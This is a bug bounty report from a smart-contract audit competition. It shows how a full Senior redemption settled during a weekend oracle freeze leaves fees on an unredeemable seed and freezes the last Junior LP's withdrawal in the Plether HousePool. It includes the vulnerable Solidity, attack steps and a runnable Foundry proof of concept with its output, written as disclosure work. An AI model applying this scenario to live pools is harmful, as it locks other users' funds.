# \#97881 [SC-High] Unredeemable Senior seed counted by the Junior withdrawal covenant in HousePool leads to temporary freezing of funds for at least 24 hours

**Submitted on Nov 3rd 2026 at 18:11:50 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97881
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

While the oracle is frozen, a funded Senior redemption pays a 25 bps surcharge that stays in Senior principal for the Senior LPs who remain. When every Senior LP exits in the same frozen settlement, the only Senior holder left is the bootstrap seed floor, which can never be redeemed, so the fee becomes Senior principal that nobody can withdraw. The Junior withdrawal covenant still counts that principal and holds back Junior equal to a quarter of it. The last Junior LP cannot withdraw that amount, and the Senior coupon on the seed's principal is paid out of it until it is gone. Any Senior LP's ordinary weekend redemption triggers it. In the run below, after a 20,000,000 USDG Senior exit on a Friday evening, a 10,000,000 USDG Junior LP gets back 9,968,255.97 USDG and 12,507.75 USDG stays frozen while the pool holds 62,609.82 USDG of free cash. Nothing comes out at +25 h, +7 days or +30 days, the coupon drains it to 0 in four years, and the owner's fastest fix waits on the 72-hour pool-config timelock. The same Senior exit settled at a live time lets the Junior LP exit completely.

Four points up front:

- **Not a lack of liquidity.** The pool holds 62,609.82 USDG of free cash, five times the stuck 12,507.75. The cash is there; the covenant formula blocks it.
- **It never clears by itself.** With no owner action, the stuck money is paid as coupon into the seed and is gone after four years.
- **The documented ways out don't work.** SECURITY.md says an over-limit pool is cured by "funded Senior redemptions, Junior deposits, or subsequent revenue" (`SECURITY.md:1209-1212`). The seed can never redeem. A new Junior depositor just takes over the stuck amount. Revenue adds Junior above the floor, but the floor stays.
- **Weekends don't freeze withdrawals.** LP withdrawals stay open during the oracle freeze (`SECURITY.md:829-833`). The Junior freeze is measured on weekdays, and in the control the same LP exits fully.

## Vulnerability Details

During `oracleFrozen`, `_settlementFeeBps` returns `seniorFrozenLpFeeBps`, 25 bps at release (`HousePool.sol:1147-1155`). Senior principal falls only by the net assets funded (`HousePool.sol:857-859`), so the fee stays in the tranche: "the fee remains inside the same tranche and therefore benefits incumbent LPs of that tranche only" (`ACCOUNTING_SPEC.md:578`).

When the Senior LP redeems its whole position in one frozen settlement, Senior supply is the seed floor and nothing else. The seed receiver cannot transfer below the floor (`TrancheVault.sol:322-324`), and its redeemable shares exclude the floor (`TrancheVault.sol:1630-1636`), so `maxRequestRedeem(seedReceiver)` is 0. The 50,049.01 USDG of Senior principal now belongs to shares that can never leave.

Junior withdrawals are capped by the covenant. `getMaxJuniorWithdraw` and the settlement path use `_juniorSettlementCapacity`, which calls `juniorWithdrawalRatioCap` with the full `seniorPrincipal` (`HousePool.sol:1209-1216`). The cap keeps `exposure * (BPS - maxSeniorShareBps) / maxSeniorShareBps` of Junior in the pool (`HousePoolSeniorCapacityLib.sol:86-89`): a quarter of Senior principal at the release 8,000 bps. The seed's principal counts the same as a Senior LP's, so 12,521.96 USDG of Junior is held back with no Senior LP left to protect.

The Senior coupon keeps accruing on that principal. `_checkpointSeniorCouponBeforePrincipalMutation` pays it from Junior to Senior whenever Junior shares exist (`HousePool.sol:1737-1754`). The held-back Junior is paid into the seed's principal, which raises the covenant floor, until the Junior value reaches 0.

The guard that should have stopped this is a covenant that excludes Senior principal held by the unredeemable seed floor, or a frozen fee that does not accrue to a tranche with no redeemable holder. Neither exists. The owner can lower the floor only by raising `maxSeniorShareBps` through `proposePoolConfig`, which waits `TIMELOCK_DELAY = 72 hours` (`HousePool.sol:189`, `:311`).

### Vulnerable source code

**1. The frozen surcharge** @ packages/perps/src/HousePool.sol:1147-1155
```solidity
    function _settlementFeeBps(
        bool isSenior,
        bool oracleFrozen
    ) internal view returns (uint256) {
        if (!oracleFrozen) {
            return 0;
        }
        return isSenior ? poolConfig.seniorFrozenLpFeeBps : poolConfig.juniorFrozenLpFeeBps;
    }
```

**2. Senior principal falls by the net funded assets only** @ packages/perps/src/HousePool.sol:857-859
```solidity
        if (seniorPhase.fundedAssets > 0) {
            HousePoolWaterfallAccountingLib.WaterfallState memory nextState =
                HousePoolWaterfallAccountingLib.scaleSeniorOnWithdraw(_getWaterfallState(), seniorPhase.fundedAssets);
```

**3. The seed receiver cannot move the floor** @ packages/perps/src/TrancheVault.sol:322-324
```solidity
        if (from == seedReceiver && from != address(0) && balanceOf(from) - amount < seedShareFloor) {
            revert TrancheVault__SeedFloorBreached();
        }
```

**4. The floor is never redeemable** @ packages/perps/src/TrancheVault.sol:1630-1636
```solidity
    function _unlockedOwnerShares(
        address owner
    ) internal view returns (uint256 ownerShares) {
        ownerShares = balanceOf(owner);
        if (owner == seedReceiver && seedReceiver != address(0)) {
            ownerShares = ownerShares > seedShareFloor ? ownerShares - seedShareFloor : 0;
        }
```

**5. The covenant counts all Senior principal, the seed's included** @ packages/perps/src/HousePool.sol:1209-1216
```solidity
        uint256 ratioCap = HousePoolSeniorCapacityLib.juniorWithdrawalRatioCap(
            state.seniorPrincipal,
            state.seniorHighWaterMark,
            state.juniorPrincipal,
            reservedSeniorDepositAssets,
            poolConfig.maxSeniorShareBps
        );
        return _min(freeAssets, _min(state.juniorPrincipal, ratioCap));
```

**6. Junior must keep a quarter of Senior exposure** @ packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol:86-89
```solidity
        uint256 requiredJunior =
            _saturatingMulDiv(exposure, BPS - maxSeniorShareBps, maxSeniorShareBps, Math.Rounding.Ceil);
        return juniorPrincipal > requiredJunior ? juniorPrincipal - requiredJunior : 0;
    }
```

**7. The coupon on the seed's principal is paid from Junior** @ packages/perps/src/HousePool.sol:1749-1753
```solidity
        if (_juniorShareSupply() > 0) {
            (HousePoolWaterfallAccountingLib.WaterfallState memory state,) = HousePoolWaterfallAccountingLib.paySeniorCoupon(
                _getWaterfallState(), poolConfig.seniorRateBps, couponElapsed
            );
            _setWaterfallState(state);
```

**8. The owner's fix waits 72 hours** @ packages/perps/src/HousePool.sol:189
```solidity
    uint256 public constant TIMELOCK_DELAY = 72 hours;
```

### Not a known issue

- Cecuro MED-19 (accepted) says pending Senior deposits can limit Junior withdrawals. Here there are no pending deposits; the limit comes from the seed's principal.
- `SECURITY.md:1393` says a governance cap cut can limit Junior withdrawals. Here nobody changes any setting.
- The AI scan's "Permissionless frozen-state settlement can apply an unsnapshotted redemption fee" is about the fee taken from the person exiting. Here the victim is a Junior LP, who pays no fee.
- The permanent seed is documented only as a home for rounding dust (`SECURITY.md:918`, `:1416`), not as a Senior holder that Junior must back and pay coupon to.

## Impact Details

- Impact row: "Temporary freezing of funds for at least 24 hours" (High). Victim LP_J's 12,507.750179 USDG of Junior cannot leave: `getMaxJuniorWithdraw()` is 0 while the pool holds 62,609.817404 USDG of free cash. One more exit epoch at +25 h, +169 h and +721 h after the exit stalled returns 0 USDG each time, with 12,177.972958 USDG still stuck at +721 h (30 days). With no owner action the stuck value is 8,501.03, 4,450.39, 454.64 and 0 USDG after years 1 to 4; the coupon moved it into the seed's Senior principal, 62,609.82 USDG at year 4.
- Control: the same 20,000,000 USDG Senior exit settled at a live time leaves the seed at 1.049399 USDG of principal, and LP_J exits completely with 9,995,795.99 USDG.
- The freeze does not clear itself, and the fastest fix is the owner's. Raising `maxSeniorShareBps` to 9,999 has a 72 h 0 min timelock, `finalizePoolConfig` one second early reverts, and LP_J's next exits pay 12,380.80 USDG only at +75 h 59 min after the exit stalled. An owner who acts at once still leaves the funds frozen for more than 72 hours.
- After that fix, 50,134.510974 USDG of Senior principal stays in the seed floor, which no address can redeem. It is the exiting Senior LP's fee, held by the protocol's seed address. We report it as a fact and do not claim it as frozen user funds.
- Trigger: the redemption that empties Senior is funded in the weekend freeze. In the run LP_S files at Friday 20:40 UTC and a keeper settles at 21:02 UTC with the oracle frozen. No privileged action and no attacker are needed; a holder of the whole Senior tranche triggers it at will for the 25 bps fee.
- This happens in normal operation. The contracts can't be upgraded, so every new version needs a full LP drain and migration (`DEPLOYMENT.md:22-23`, `:508`), and whoever is last out of Junior gets stuck. A Senior whale leaving or a panic exit also triggers it.
- Scale: the seed locks 0.25% of the last weekend Senior exit. Junior is stuck with a quarter of that, 0.0625%: 12,507.75 USDG for a 20,000,000 USDG exit, about 25,000 USDG at the 40,000,000 USDG Senior cap. The quarter comes from the 80% Senior share limit: (100 - 80) / 80.
- Victim: the last Junior LP. The 12,507.75 USDG is their money. Who else is affected:

| Who | Harm | How much (20M Senior exit) |
|---|---|---|
| The last Junior LP(s) | Main victim. Junior LPs who leave earlier get out in full. Whoever holds the final slice can't withdraw it, and it slowly drains into the seed. One person if one is last, several sharing it if they're last together. A new Junior depositor becomes the one holding it | 12,507 USDG stuck, about 25k at the 40M Senior cap |
| Every Junior LP still in the pool | Shared, small. Junior pays the 8% coupon on the seed's 50k, about 4k a year in total, split pro rata, and gets nothing back | Tiny per person in a big pool |
| The Senior LP who exited | Nothing extra. They pay the documented 25 bps fee either way. Normally it goes to the Senior LPs who remain; here it ends up in the seed, where nobody can use it | 0 beyond the normal fee |
| The seed's ~50k | Locked forever on the protocol's seed address, which can never withdraw it. Destroyed value rather than a loss to one user | ~50k, permanent |
| The protocol / owner | Only if nobody acts for about 4 years: Junior is fully wiped and new deposits revert until the owner adds their own money | Only in that no-action case |

The new-depositor and wipe rows are shown by the follow-on tests in the gist (`SeedPinFollowOnPoC.t.sol`, output below).

## References

Frozen Senior exit
- packages/perps/src/HousePool.sol:1147-1155 - frozen surcharge, 25 bps Senior
- packages/perps/src/HousePool.sol:857-859 - Senior principal falls by net funded assets
- packages/perps/ACCOUNTING_SPEC.md:578 - the fee benefits incumbent LPs of the same tranche

Seed floor
- packages/perps/src/TrancheVault.sol:322-324 - the seed receiver cannot transfer below the floor
- packages/perps/src/TrancheVault.sol:1630-1636 - the floor is excluded from redeemable shares

Covenant and coupon
- packages/perps/src/HousePool.sol:1275-1282 - `getMaxJuniorWithdraw`
- packages/perps/src/HousePool.sol:1209-1216 - `juniorWithdrawalRatioCap` with the full Senior principal
- packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol:64-90 - required Junior = exposure x (1 - share) / share
- packages/perps/src/HousePool.sol:1737-1754 - Senior coupon paid from Junior

Owner fix
- packages/perps/src/HousePool.sol:189, :311 - `TIMELOCK_DELAY = 72 hours` on pool config

Docs
- packages/perps/SECURITY.md:829-833 - LP withdrawals stay open while the oracle is frozen
- packages/perps/SECURITY.md:1209-1212 - the documented cures for an over-limit pool
- packages/perps/DEPLOYMENT.md:22-23, :508 - no upgrades; a new version needs an LP drain and migration


## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/11a54f6657218f813fdfc19760054774

## Proof of Concept

## Proof of Concept

One main test, plus two follow-on tests in the gist for the new depositor and the four-year wipe (see the end of this section). From one snapshot the main test runs the control (the Senior exit settled live), then the frozen Senior exit and the Junior LP's exit attempts, then two branches: the owner's fastest fix proposed at once, and no owner action for four years. It runs in the repo's Foundry suite at a82d4fef on the repo's own `BasePerpTest` with the `DEPLOYMENT.md` release parameters; only USDG and Pyth are the repo's mocks. Files: https://gist.github.com/decies-centena-millia/11a54f6657218f813fdfc19760054774

```bash
mkdir -p packages/perps/test/poc && cp SeedCapturedSeniorPinsJuniorPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/SeedCapturedSeniorPinsJuniorPoC.t.sol -vv
```

### attack step-by-step

1. Monday 2024-10-14 10:00 UTC: LP_J deposits 10,000,000 USDG of Junior and LP_S 20,000,000 USDG of Senior, over the release seeds of 1 USDG each.
2. Friday 20:40 UTC: LP_S requests redemption of all its Senior. At 21:02 UTC, with the oracle frozen, a keeper's `HousePool.settleLpEpoch(0, 0)` funds it: LP_S receives 19,969,136.21 USDG and the 25 bps fee stays as 50,049.01 USDG of Senior principal on the seed floor.
3. Monday: LP_J requests redemption of everything it can, 30 times, one live epoch each. It receives 9,968,255.97 USDG; 12,507.75 USDG is left and `getMaxJuniorWithdraw()` is 0.
4. Branch 1: the owner proposes `maxSeniorShareBps = 9999` at once, finalizes after the 72 h timelock, and LP_J's next exits pay 12,380.80 USDG.
5. Branch 2: no owner action. LP_J's exit epochs at +25 h, +169 h, +721 h and in years 1 to 4 return 0 USDG while the stuck value falls to 0.

## main Attack code

```solidity
vm.prank(LP_S);
uint256 sid = seniorVault.requestRedeem(seniorVault.maxRequestRedeem(LP_S), LP_S, LP_S); // Friday 20:40 UTC
vm.warp(FRI_FROZEN_START + 120);                                                          // 21:02 UTC, oracle frozen
vm.prank(KEEPER);
pool.settleLpEpoch(0, 0);                                                                 // funds the whole Senior exit, the fee stays
// Senior supply == seedShareFloor; Junior covenant now holds back seniorPrincipal / 4
vm.prank(LP_J);
juniorVault.requestRedeem(juniorVault.maxRequestRedeem(LP_J), LP_J, LP_J);                // returns 0 USDG for the last 12,507.75
```

```
plant : every Senior LP redeems in the weekend freeze
fire  : the frozen settleLpEpoch that funds the last Senior redemption
```

### full poc code, single file, single runnable command

The whole file is [`SeedCapturedSeniorPinsJuniorPoC.t.sol`](https://gist.github.com/decies-centena-millia/11a54f6657218f813fdfc19760054774#file-seedcapturedseniorpinsjuniorpoc-t-sol) in the gist, 503 lines: a `PocBase` fixture over the repo's `packages/perps/test/perps/BasePerpTest.sol` with the release parameters, then `SeedCapturedSeniorPinsJuniorPoC`. The run's complete `-vv` output is [`output.log`](https://gist.github.com/decies-centena-millia/11a54f6657218f813fdfc19760054774#file-output-log). Command, from the repo root at a82d4fef:

```bash
mkdir -p packages/perps/test/poc && cp SeedCapturedSeniorPinsJuniorPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/SeedCapturedSeniorPinsJuniorPoC.t.sol -vv
```

The test and the functions it calls, verbatim from that file:

```solidity
contract SeedCapturedSeniorPinsJuniorPoC is PocBase {
    uint256 internal constant JUNIOR = 10_000_000e6;
    uint256 internal constant SENIOR = 20_000_000e6;

    struct Pin {
        uint256 t;
        uint256 stuck;
        uint256 free;
        uint256 maxJuniorWithdraw;
        uint256 seedSenior;
        uint256 got;
    }

    function _settleAny() internal {
        if (engine.isOracleFrozen()) {
            vm.prank(KEEPER);
            try pool.settleLpEpoch(0, 0) {} catch {}
        } else {
            bytes[] memory d = _px(PX);
            vm.prank(KEEPER);
            try router.settleLpEpoch(d) {} catch {}
        }
    }

    // The victim claims every funded or refunded request it ever opened.
    function _claimAll() internal {
        for (uint256 i; i < requestIds.length; ++i) {
            uint256 rid = requestIds[i];
            uint256 c = juniorVault.claimableRedeemRequest(rid, LP_J);
            if (c != 0) {
                vm.prank(LP_J);
                juniorVault.claimRedeem(rid, c, LP_J, LP_J);
            }
            if (juniorVault.refundableRedeemRequest(rid, LP_J) != 0) {
                vm.prank(LP_J);
                juniorVault.claimRedeemRefund(rid, LP_J, LP_J);
            }
        }
    }

    // The victim asks for everything it can redeem, a keeper settles the next epoch, the victim claims; `epochs` times.
    function _exitJunior(uint256 epochs) internal returns (uint256 received) {
        uint256 bal0 = settlementToken.balanceOf(LP_J);
        for (uint256 e; e < epochs; e++) {
            uint256 m = juniorVault.maxRequestRedeem(LP_J);
            if (m != 0) {
                vm.prank(LP_J);
                requestIds.push(juniorVault.requestRedeem(m, LP_J, LP_J));
            }
            _warpIntoNextEpoch(60);
            _settleAny();
            _claimAll();
        }
        received = settlementToken.balanceOf(LP_J) - bal0;
    }

    function _stuck() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.totalSupply() - juniorVault.seedShareFloor());
    }

    function _pin(string memory tag, uint256 since, uint256 epochs) internal returns (Pin memory p) {
        p.got = _exitJunior(epochs);
        p.t = _now();
        p.stuck = _stuck();
        p.free = pool.getFreeAssets();
        p.maxJuniorWithdraw = pool.getMaxJuniorWithdraw();
        p.seedSenior = pool.seniorPrincipal();
        console2.log(string.concat("-- ", tag, " +", _hm(p.t - since), ", unix ", vm.toString(p.t)));
        console2.log(
            string.concat(
                "   victim LP_J got this time: ", _usd(p.got), "  still stuck: ", _usd(p.stuck), "  getMaxJuniorWithdraw: ", _usd(p.maxJuniorWithdraw)
            )
        );
        console2.log(string.concat("   pool free cash: ", _usd(p.free), "  Senior principal (seed only): ", _usd(p.seedSenior)));
    }

    function _seniorExit(bool frozen) internal returns (uint256 got) {
        if (frozen) {
            _warpTo(FRI_FAD_START + 600);
        } else {
            _warpTo(WEEK_MON_10UTC + 1 days);
        }
        (uint256 sid,) = _requestRedeemAll(seniorVault, LP_S);
        if (frozen) {
            _warpTo(FRI_FROZEN_START + 120);
            assertTrue(engine.isOracleFrozen(), "the Senior exit settles in the frozen window");
        } else {
            _warpIntoNextEpoch(60);
            assertFalse(engine.isOracleFrozen(), "control: live settlement");
        }
        _settleAny();
        got = _claimRedeemAll(seniorVault, LP_S, sid);
    }

    function test_frozenSeniorExit_seedCapturesFee_pinsJuniorLp_noSelfClear() public {
        _warpTo(WEEK_MON_10UTC);
        _seedPool(JUNIOR, SENIOR);
        console2.log(
            string.concat("setup: victim LP_J Junior ", _usd(JUNIOR), ", LP_S Senior ", _usd(SENIOR), ", release seeds 1 USDG each")
        );
        uint256 snap = vm.snapshotState();

        uint256 sGotControl = _seniorExit(false);
        _warpTo(_now() + 2 hours);
        uint256 jGotControl = _exitJunior(30);
        console2.log(
            string.concat(
                "CONTROL (Senior exit settled live, Tuesday): LP_S got ", _usd(sGotControl), ", victim LP_J got ", _usd(jGotControl), ", stuck ", _usd(_stuck())
            )
        );
        assertLt(_stuck(), 1e6, "control: the victim exits completely");
        uint256 seedControl = pool.seniorPrincipal();
        vm.revertToState(snap);

        uint256 sGot = _seniorExit(true);
        address seedRcv = seniorVault.seedReceiver();
        console2.log(
            string.concat(
                "Senior LP files a full redemption Friday 20:40 UTC; it settles at 21:02 UTC (oracle frozen): LP_S got ", _usd(sGot)
            )
        );
        console2.log(
            string.concat(
                "   Senior supply ", vm.toString(seniorVault.totalSupply()), " = seed floor ", vm.toString(seniorVault.seedShareFloor()),
                "; Senior principal now ", _usd(pool.seniorPrincipal()), "; seed receiver maxRequestRedeem ", vm.toString(seniorVault.maxRequestRedeem(seedRcv))
            )
        );
        assertEq(seniorVault.totalSupply(), seniorVault.seedShareFloor(), "only the seed floor is left in Senior");
        assertEq(seniorVault.maxRequestRedeem(seedRcv), 0, "the seed floor can never be redeemed");

        _warpTo(SUN_REOPEN + 1 days + 12 hours);
        _refreshMark(PX);
        Pin memory p0 = _pin("victim LP_J tries to exit completely over 30 live epochs (Monday), time since the first request:", _now(), 30);
        uint256 tPin0 = p0.t;
        assertGt(p0.stuck, 10_000e6, "Junior value pinned");
        assertEq(p0.maxJuniorWithdraw, 0, "no Junior withdrawal capacity");
        assertGt(p0.free, p0.stuck, "the pool holds the cash");
        console2.log(string.concat("   covenant floor = Senior principal / 4 = ", _usd(pool.seniorPrincipal() / 4)));
        uint256 snapPin = vm.snapshotState();

        // Fastest owner remedy: raise maxSeniorShareBps through the pool-config timelock.
        IHousePool.PoolConfig memory cfg = _currentPoolConfig();
        cfg.maxSeniorShareBps = 9999;
        pool.proposePoolConfig(cfg);
        uint256 tPropose = _now();
        uint256 activation = pool.poolConfigActivationTime();
        _warpTo(activation - 1);
        (bool earlyOk,) = address(pool).call(abi.encodeCall(pool.finalizePoolConfig, ()));
        assertFalse(earlyOk, "the remedy cannot be finalized before the timelock");
        _warpTo(activation);
        pool.finalizePoolConfig();
        uint256 remedyGot = _exitJunior(4);
        uint256 tRemedy = _now();
        console2.log(
            string.concat(
                "OWNER REMEDY proposed at once: timelock ", _hm(activation - tPropose), "; finalize 1 s early reverts; after it the victim got ",
                _usd(remedyGot), " at +", _hm(tRemedy - tPin0), " after the exit stalled, stuck left ", _usd(_stuck())
            )
        );
        assertGt(remedyGot, (p0.stuck * 98) / 100, "the remedy releases the pinned Junior");
        uint256 seedAfterRemedy = pool.seniorPrincipal();
        console2.log(string.concat("   Senior principal still held by the unredeemable seed after the remedy: ", _usd(seedAfterRemedy)));
        vm.revertToState(snapPin);

        uint256[3] memory waits = [uint256(24 hours), 7 days, 30 days];
        string memory tag = "NO OWNER ACTION, one more exit epoch, time since the exit stalled:";
        Pin memory p;
        for (uint256 i; i < 3; ++i) {
            _toLiveDay(tPin0 + waits[i]);
            p = _pin(tag, tPin0, 1);
            assertEq(p.got, 0, "nothing comes out");
            assertGt(p.stuck, 10_000e6, "still pinned");
            assertGt(p.free, p.stuck, "with the cash in the pool");
        }
        uint256 stuck30d = p.stuck;
        uint256 t30d = p.t;
        for (uint256 y = 1; y <= 4; y++) {
            _toWeekdayNoon(tPin0 + y * 365 days);
            _settleAny();
            p = _pin(string.concat("NO OWNER ACTION, year ", vm.toString(y), ", three exit epochs, time since the exit stalled:"), tPin0, 3);
        }
        assertLt(p.stuck, 1e6, "after four years the pinned Junior has been paid away as coupon");
        assertGt(p.seedSenior, seedAfterRemedy, "into the seed's Senior principal");

        console2.log("");
        _row("account", "control (live exit)", "attack (frozen exit)", "delta");
        _row("VICTIM LP_J unredeemable", "0.000000", _usd(p0.stuck), _usdSigned(int256(p0.stuck)));
        _row("seed Senior principal", _usd(seedControl), _usd(p0.seedSenior), _usdSigned(int256(p0.seedSenior) - int256(seedControl)));
        console2.log("");
        console2.log("IMPACT row: Temporary freezing of funds for at least 24 hours (High)");
        console2.log(
            string.concat(
                "IMPACT frozen: ", _usd(p0.stuck), " USDG of victim LP_J's Junior; getMaxJuniorWithdraw() = 0 while the pool holds ", _usd(p0.free), " USDG of free cash"
            )
        );
        console2.log(
            string.concat(
                "IMPACT frozen for: still ", _usd(stuck30d), " USDG stuck at +", _hm(t30d - tPin0), " (", vm.toString((t30d - tPin0) / 1 days), " days) with no owner action; 0 left after 4 years, all paid as Senior coupon into the seed"
            )
        );
        console2.log("IMPACT self-clears: no. Every exit epoch returns 0 USDG");
        console2.log(
            string.concat(
                "IMPACT fastest owner remedy (maxSeniorShareBps, pool-config timelock ", _hm(activation - tPropose), "): funds back only at +", _hm(tRemedy - tPin0), " after the exit stalled"
            )
        );
        console2.log(
            string.concat("IMPACT control, the same Senior exit settled live: the victim exits completely, ", _usd(jGotControl), " USDG")
        );
        console2.log(
            string.concat(
                "IMPACT seed: ", _usd(seedAfterRemedy), " USDG of Senior principal stays in the seed floor, which no address can redeem, even after the remedy"
            )
        );
    }

    // _hm, _toLiveDay and _toWeekdayNoon are in the gist file
}
```

### Output

```
Ran 1 test for test/poc/SeedCapturedSeniorPinsJuniorPoC.t.sol:SeedCapturedSeniorPinsJuniorPoC
[PASS] test_frozenSeniorExit_seedCapturesFee_pinsJuniorLp_noSelfClear() (gas: 61409938)
Logs:
  setup: victim LP_J Junior 10000000.000000, LP_S Senior 20000000.000000, release seeds 1 USDG each
  CONTROL (Senior exit settled live, Tuesday): LP_S got 20004204.008117, victim LP_J got 9995795.992024, stuck 0.000000
  Senior LP files a full redemption Friday 20:40 UTC; it settles at 21:02 UTC (oracle frozen): LP_S got 19969136.210044
     Senior supply 1000000000 = seed floor 1000000000; Senior principal now 50049.010584; seed receiver maxRequestRedeem 0
  -- victim LP_J tries to exit completely over 30 live epochs (Monday), time since the first request: +30 h 1 min, unix 1729695661
     victim LP_J got this time: 9968255.972552  still stuck: 12507.750179  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 50087.853923
     covenant floor = Senior principal / 4 = 12521.963480
  OWNER REMEDY proposed at once: timelock 72 h 0 min; finalize 1 s early reverts; after it the victim got 12380.803226 at +75 h 59 min after the exit stalled, stuck left 0.000000
     Senior principal still held by the unredeemable seed after the remedy: 50134.510974
  -- NO OWNER ACTION, one more exit epoch, time since the exit stalled: +25 h 0 min, unix 1729785661
     victim LP_J got this time: 0.000000  still stuck: 12496.315462  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 50087.853923
  -- NO OWNER ACTION, one more exit epoch, time since the exit stalled: +169 h 0 min, unix 1730304061
     victim LP_J got this time: 0.000000  still stuck: 12430.451496  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 50087.853923
  -- NO OWNER ACTION, one more exit epoch, time since the exit stalled: +721 h 0 min, unix 1732291261
     victim LP_J got this time: 0.000000  still stuck: 12177.972958  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 50087.853923
  -- NO OWNER ACTION, year 1, three exit epochs, time since the exit stalled: +8760 h 0 min, unix 1761231661
     victim LP_J got this time: 0.000000  still stuck: 8501.025555  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 50087.853923
  -- NO OWNER ACTION, year 2, three exit epochs, time since the exit stalled: +17616 h 0 min, unix 1793113261
     victim LP_J got this time: 0.000000  still stuck: 4450.391620  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 50087.853923
  -- NO OWNER ACTION, year 3, three exit epochs, time since the exit stalled: +26352 h 0 min, unix 1824562861
     victim LP_J got this time: 0.000000  still stuck: 454.644325  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 50087.853923
  -- NO OWNER ACTION, year 4, three exit epochs, time since the exit stalled: +35088 h 0 min, unix 1856012461
     victim LP_J got this time: 0.000000  still stuck: 0.000000  getMaxJuniorWithdraw: 0.000000
     pool free cash: 62609.817404  Senior principal (seed only): 62609.817404
      account                       control (live exit)   attack (frozen exit)  delta
      VICTIM LP_J unredeemable      0.000000              12507.750179          +12507.750179
      seed Senior principal         1.049399              50087.853923          +50086.804524
  IMPACT row: Temporary freezing of funds for at least 24 hours (High)
  IMPACT frozen: 12507.750179 USDG of victim LP_J's Junior; getMaxJuniorWithdraw() = 0 while the pool holds 62609.817404 USDG of free cash
  IMPACT frozen for: still 12177.972958 USDG stuck at +721 h 0 min (30 days) with no owner action; 0 left after 4 years, all paid as Senior coupon into the seed
  IMPACT self-clears: no. Every exit epoch returns 0 USDG
  IMPACT fastest owner remedy (maxSeniorShareBps, pool-config timelock 72 h 0 min): funds back only at +75 h 59 min after the exit stalled
  IMPACT control, the same Senior exit settled live: the victim exits completely, 9995795.992024 USDG
  IMPACT seed: 50134.510974 USDG of Senior principal stays in the seed floor, which no address can redeem, even after the remedy

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 60.46ms (52.93ms CPU time)

Ran 1 test suite in 61.64ms (60.46ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Victim LP_J holds 12,507.750179 USDG it cannot redeem after the frozen Senior exit, against 0 in the control, while the seed's unredeemable Senior principal goes from 1.049399 to 50,087.853923 USDG.

Note on the output: `Senior principal (seed only)` prints the pool's stored `seniorPrincipal` (`HousePool.sol:149`), which is written only at accounting checkpoints. That is why it stays at 50,087.85 in years 1 to 3. The stuck figure uses the vault's live view (`TrancheVault.totalAssets` → `getPendingTrancheState`, `TrancheVault.sol:510-513`), which includes the coupon accrued since then. By year 4 a checkpoint has written it: 62,609.82, the whole remaining pool.

### Follow-on tests

[`SeedPinFollowOnPoC.t.sol`](https://gist.github.com/decies-centena-millia/11a54f6657218f813fdfc19760054774#file-seedpinfollowonpoc-t-sol) in the gist uses the same fixture (it imports `PocBase` from the main file) and the same frozen Senior exit. Copy both files into `packages/perps/test/poc/`, then from `packages/perps`:

```bash
forge test --match-path test/poc/SeedPinFollowOnPoC.t.sol -vv
```

- `test_newJuniorDepositorInheritsThePin`: a new LP deposits 100,000 USDG of Junior. The stuck LP gets out, and the newcomer gets back 87,467.13 and is now stuck with 12,517.47.
- `test_noOwnerAction_juniorWipedAfterFourYears_depositsRevert_untilOwnerRecapitalizes`: after four years Junior principal is 0 with shares still outstanding. New Junior and Senior deposits revert, still 30 days later. The owner's `recapitalizePool` alone doesn't fix it; `assignUnassignedAssets` to Junior does.

Output, from [`output-followon.log`](https://gist.github.com/decies-centena-millia/11a54f6657218f813fdfc19760054774#file-output-followon-log):

```
[PASS] test_newJuniorDepositorInheritsThePin() (gas: 45334863)
  after the frozen Senior exit and 30 Junior exit epochs: victim LP_J still stuck 12507.750179, getMaxJuniorWithdraw 0.000000, pool free cash 62609.817404
  a new Junior LP_J2 deposits 100000.000000 (requestDeposit, keeper settleLpEpoch, claimDeposit)
     victim LP_J now gets out: received 12507.140196, left 0.000000
     newcomer LP_J2 tries to exit fully over 20 epochs: received 87467.127206 of 100000.000000, still stuck 12517.468116, getMaxJuniorWithdraw 0.000000
     pool free cash 62635.550002, covenant floor = Senior principal / 4 = 12527.110000

[PASS] test_noOwnerAction_juniorWipedAfterFourYears_depositsRevert_untilOwnerRecapitalizes() (gas: 39233363)
  -- no owner action, year 4: LP_J got 0.000000, still stuck 0.000000; Junior principal 0.000000, Senior principal (seed only) 62609.817404
     Junior supply 13194469610263 shares, Junior principal 0; seed Senior principal 62609.817404
     new Junior deposit reverts TrancheVault__TerminallyWiped; new Senior deposit reverts TrancheVault__DepositsUnavailable
     30 days later, still: new Junior deposit reverts TrancheVault__TerminallyWiped
  OWNER recapitalizePool(200000.000000): pending recapitalization 200000.000000, Junior principal 0.000000, new Junior deposit still reverts TrancheVault__TerminallyWiped
  OWNER assignUnassignedAssets(false, owner): Junior principal 200000.000000, owner's Junior shares 2638893922252601000000000; new Junior deposit request now succeeds
```

